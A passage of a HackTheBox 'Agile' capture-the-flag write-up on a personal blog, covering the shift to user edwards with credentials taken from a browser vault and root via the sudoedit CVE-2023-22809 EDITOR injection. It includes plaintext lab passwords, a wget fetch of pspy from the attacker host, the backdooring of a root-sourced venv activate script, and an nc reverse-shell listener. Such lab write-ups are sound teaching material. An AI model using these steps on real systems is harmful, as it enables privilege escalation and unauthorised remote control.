+<p><img src="/p/hackthebox-agile/Images/SuperpassTestSession.png"
+	width="1094"
+	height="633"
+	srcset="/p/hackthebox-agile/Images/SuperpassTestSession_hu10797981576706718286.png 480w, /p/hackthebox-agile/Images/SuperpassTestSession_hu16490497076890412944.png 1024w"
+	loading="lazy"
+	
+		alt="Interactive Chrome Session in test.superpass.htb"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="172"
+		data-flex-basis="414px"
+	
+></p>
+<p>Selecting the Vault, we see new passwords, this time for <code>edwards</code>. This was also a user account name on the machine.</p>
+<p><img src="/p/hackthebox-agile/Images/EdCred.png"
+	width="1114"
+	height="432"
+	srcset="/p/hackthebox-agile/Images/EdCred_hu16924771919743161901.png 480w, /p/hackthebox-agile/Images/EdCred_hu15868018577581926943.png 1024w"
+	loading="lazy"
+	
+		alt="Eds Creds"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="257"
+		data-flex-basis="618px"
+	
+></p>
+<p>Using the inspect tools to the side of our web session, we can easily grab the raw text to copy. For this kind of password it is much better, so that we do not mistype when copying by hand.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">     <span class="p">&lt;</span><span class="nt">td</span><span class="p">&gt;</span>agile<span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">td</span><span class="p">&gt;</span>edwards<span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">td</span><span class="p">&gt;</span>d07867c6267dcb5df0af<span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>edwards:d07867c6267dcb5df0af</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">corum@agile:~$ su edwards
+</span></span><span class="line"><span class="cl">Password: 
+</span></span><span class="line"><span class="cl">edwards@agile:/home/corum$ 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="privilege-escalation-through-sudo-vulnerability">Privilege escalation through <code>sudo</code> vulnerability
+</h2><p>The <code>su</code> is successful, and we now have 1 more user&rsquo;s account to work with. Checking this account&rsquo;s privileges, we see we can perform a <code>sudo</code> as dev_admin:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">edwards@agile:/home/corum$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries for edwards on agile:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
+</span></span><span class="line"><span class="cl">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User edwards may run the following commands on agile:
+</span></span><span class="line"><span class="cl">    (dev_admin : dev_admin) sudoedit /app/config_test.json
+</span></span><span class="line"><span class="cl">    (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This <code>/app/app-testing/tests/functional/creds.txt</code> is very desirable based on the name, and is only accessible by dev_admin. Upon running:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">edwards@agile:/home/corum$ sudo -u dev_admin sudoedit /app/app-testing/tests/functional/creds.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/hackthebox-agile/Images/EdCred2.png"
+	width="597"
+	height="93"
+	srcset="/p/hackthebox-agile/Images/EdCred2_hu451362225046037292.png 480w, /p/hackthebox-agile/Images/EdCred2_hu3641925051638741286.png 1024w"
+	loading="lazy"
+	
+		alt="Eds Creds 2"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="641"
+		data-flex-basis="1540px"
+	
+></p>
+<p>We see in a nano editor some more credentials for edwards.</p>
+<p><code>edwards:1d7ffjwrx#$d6qn!9nndqgde4</code></p>
+<p>The credentials don&rsquo;t work for any user on the system; perhaps they are utilized for the google chrome debugging session?</p>
+<p>Searching for problems with <code>sudoedit</code>, I quickly find a very recent CVE, <a class="link" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-22809"  target="_blank" rel="noopener"
+    >CVE-2023-22809</a>. This CVE was released in under two months from the time of writing. Affected versions are 1.8.0 through 1.9.12.p1, so first we must check this:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">edwards@agile:/home/corum$ sudo -V
+</span></span><span class="line"><span class="cl">Sudo version 1.9.9
+</span></span><span class="line"><span class="cl">Sudoers policy plugin version 1.9.9
+</span></span><span class="line"><span class="cl">Sudoers file grammar version 48
+</span></span><span class="line"><span class="cl">Sudoers I/O plugin version 1.9.9
+</span></span><span class="line"><span class="cl">Sudoers audit plugin version 1.9.9
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Version 1.9.9 will be before version 1.9.12, so this should be vulnerable! Execution seems very straightforward. If we include extra arguments in environment variables (SUDO_EDITOR, VISUAL, and EDITOR), sudoedit will allow us to edit files not meant to be edited. With this strategy, we can edit any file dev_admin can edit. Looking for interesting targets:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">edwards@agile:/home/corum$ find / -user dev_admin 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">/home/dev_admin
+</span></span><span class="line"><span class="cl">/app/app-testing/tests/functional/creds.txt
+</span></span><span class="line"><span class="cl">/app/config_test.json
+</span></span><span class="line"><span class="cl">/app/config_prod.json
+</span></span><span class="line"><span class="cl">edwards@agile:/home/corum$ find / -group dev_admin 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">/home/dev_admin
+</span></span><span class="line"><span class="cl">/app/venv
+</span></span><span class="line"><span class="cl">/app/venv/bin
+</span></span><span class="line"><span class="cl">/app/venv/bin/activate
+</span></span><span class="line"><span class="cl">/app/venv/bin/Activate.ps1
+</span></span><span class="line"><span class="cl">/app/venv/bin/activate.fish
+</span></span><span class="line"><span class="cl">/app/venv/bin/activate.csh
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Using the sudoedit exploit, we should be able to alter any of these files. But how can we really benefit from adding a line or two in some of these files? If there is a regularly running program that takes input from one of these files, we can supply malicious commands for that user to execute. Ideally, if there is a cronjob running as root for regular intervals, we can have root execute some commands for us. We can check for things as they run using pspy. Sending pspy over to the box:
+On my local kali, finding where I put pspy:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">$</span> <span class="n">locate</span> <span class="n">pspy</span>              
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">kali</span><span class="o">/</span><span class="n">Downloads</span><span class="o">/</span><span class="n">pspy64</span>
+</span></span><span class="line"><span class="cl">                                                                                                                    
+</span></span><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">Downloads</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">└─</span><span class="o">$</span> <span class="n">python</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="o">.</span><span class="n">server</span> <span class="mi">80</span>
+</span></span><span class="line"><span class="cl"><span class="n">Serving</span> <span class="n">HTTP</span> <span class="n">on</span> <span class="mf">0.0</span><span class="o">.</span><span class="mf">0.0</span> <span class="n">port</span> <span class="mi">80</span> <span class="p">(</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">0.0</span><span class="o">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">80</span><span class="o">/</span><span class="p">)</span> <span class="o">...</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>On the Agile box, downloading and running pspy:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">edwards@agile:/dev/shm$ wget 10.10.14.133/pspy64 <span class="o">&amp;&amp;</span> chmod +x pspy64
+</span></span><span class="line"><span class="cl">--2023-08-03 16:52:45--  http://10.10.14.133/pspy64
+</span></span><span class="line"><span class="cl">Connecting to 10.10.14.133:80... connected.
+</span></span><span class="line"><span class="cl">HTTP request sent, awaiting response... <span class="m">200</span> OK
+</span></span><span class="line"><span class="cl">Length: <span class="m">3104768</span> <span class="o">(</span>3.0M<span class="o">)</span> <span class="o">[</span>application/octet-stream<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Saving to: ‘pspy64’
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">pspy64                       100%<span class="o">[==============================================</span>&gt;<span class="o">]</span>   2.96M  4.00MB/s    in 0.7s    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">2023-08-03 16:52:46 <span class="o">(</span>4.00 MB/s<span class="o">)</span> - ‘pspy64’ saved <span class="o">[</span>3104768/3104768<span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">edwards@agile:/dev/shm$ ./pspy64
+</span></span><span class="line"><span class="cl">pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>After waiting a brief period, we see the root user access one of the files we can control:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">2023/08/03 16:56:01 CMD: <span class="nv">UID</span><span class="o">=</span><span class="m">0</span>     <span class="nv">PID</span><span class="o">=</span><span class="m">51843</span>  <span class="p">|</span> /bin/bash -c <span class="nb">source</span> /app/venv/bin/activate
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can see <code>activate</code> being invoked. Using our sudoedit exploit, we can alter this file to communicate back to us through a reverse shell payload.
+Setting up our environment variable:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">edwards</span><span class="err">@</span><span class="n">agile</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="o">$</span> <span class="k">export</span> <span class="n">EDITOR</span><span class="o">=</span><span class="s2">&#34;vim -- /app/venv/bin/activate&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now executing our sudoedit command:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">edwards@agile:/dev/shm$ sudo -u dev_admin sudoedit /app/app-testing/tests/functional/creds.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>When we execute we are not editing <code>creds.txt</code>. Instead, we see <code>/app/venv/bin/activate</code></p>
+<p><img src="/p/hackthebox-agile/Images/ativate.png"
+	width="941"
+	height="309"
+	srcset="/p/hackthebox-agile/Images/ativate_hu6997058159795381175.png 480w, /p/hackthebox-agile/Images/ativate_hu3197909228782116172.png 1024w"
+	loading="lazy"
+	
+		alt="/app/venv/bin/activate in vim"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="304"
+		data-flex-basis="730px"
+	
+></p>
+<p>To ensure our payload runs at the start of this script, I insert the command before the commented lines:</p>
+<p><img src="/p/hackthebox-agile/Images/Payload_added.png"
+	width="730"
+	height="172"
+	srcset="/p/hackthebox-agile/Images/Payload_added_hu9626033205432099779.png 480w, /p/hackthebox-agile/Images/Payload_added_hu5206089525695468041.png 1024w"
+	loading="lazy"
+	
+		alt="Malicious Payload"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="424"
+		data-flex-basis="1018px"
+	
+></p>
+<p>Now after waiting a few seconds, the connection reaches my kali machine:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ nc -nvlp <span class="m">8888</span>           
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">8888</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.133<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.203<span class="o">]</span> <span class="m">60376</span>
+</span></span><span class="line"><span class="cl">bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>52086<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
+</span></span><span class="line"><span class="cl">bash: no job control in this shell
+</span></span><span class="line"><span class="cl">root@agile:~# id 
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="reflection">Reflection
+</h2><p>After the IDOR vulnerability had been patched, this box turned out to be quite difficult! It was my first completion on a medium box, and the technique for remotely viewing the chrome process felt very original. While the sudo exploit felt quite simple, I appreciated that it wasn&rsquo;t completely free since only dev_admin&rsquo;s files were accessible. After going through the pain in generating the debugging PIN and sneaking into the google chrome page, it is nice to have a straightforward route to root.</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/arbitrary-file-read/">Arbitrary File Read</a>
+        
+            <a href="/tags/werkzeug/">Werkzeug</a>
+        
+            <a href="/tags/python/">Python</a>
+        
+            <a href="/tags/sudo/">Sudo</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/hackthebox-onlyforyou/">
+        
+        
+            <div class="article-image">
+                <img src="/p/hackthebox-onlyforyou/OnlyForYou.23aaa710c708eb7341f08b78acb7d1aa_hu13502282750288352538.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - OnlyForYou"
+                        
+                        data-hash="md5-I6qnEMcI63NB8It4rLfRqg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - OnlyForYou</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/hackthebox-sau/">
+        
+        
+            <div class="article-image">
+                <img src="/p/hackthebox-sau/Sau.e47c82080c294ed27892e64446e0941f_hu4137443262157332936.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Sau"
+                        
+                        data-hash="md5-5HyCCAwpTtJ4kuZERuCUHw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Sau</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/hackthebox-pilgrimage/">
+        
+        
+            <div class="article-image">
+                <img src="/p/hackthebox-pilgrimage/Pilgrimage.a429f8be38cd5289d8586e659edf33e2_hu469812373868972083.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Pilgrimage"
+                        
+                        data-hash="md5-pCn4vjjNUonYWG5lnt8z4g==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Pilgrimage</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/hackthebox-format/">
+        
+        
+            <div class="article-image">
+                <img src="/p/hackthebox-format/Format.910e024119b03811cd8466e187bde5fe_hu12179815748093413314.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Format"
+                        
+                        data-hash="md5-kQ4CQRmwOBHNhGbhh73l/g==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Format</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/hackthebox-snoopy/">
+        
+        
+            <div class="article-image">
+                <img src="/p/hackthebox-snoopy/Snoopy.5080c553490904ae8276fd384797c87a_hu1075791163206326267.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Snoopy"
+                        
+                        data-hash="md5-UIDFU0kJBK6Cdv04R5fIeg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Snoopy</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2024 Spencer&#39;s Blog
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.29.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.799eb5847effe83ae252baf7b2236f0c3752b0188dd0985faa7efc75ea805b29.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
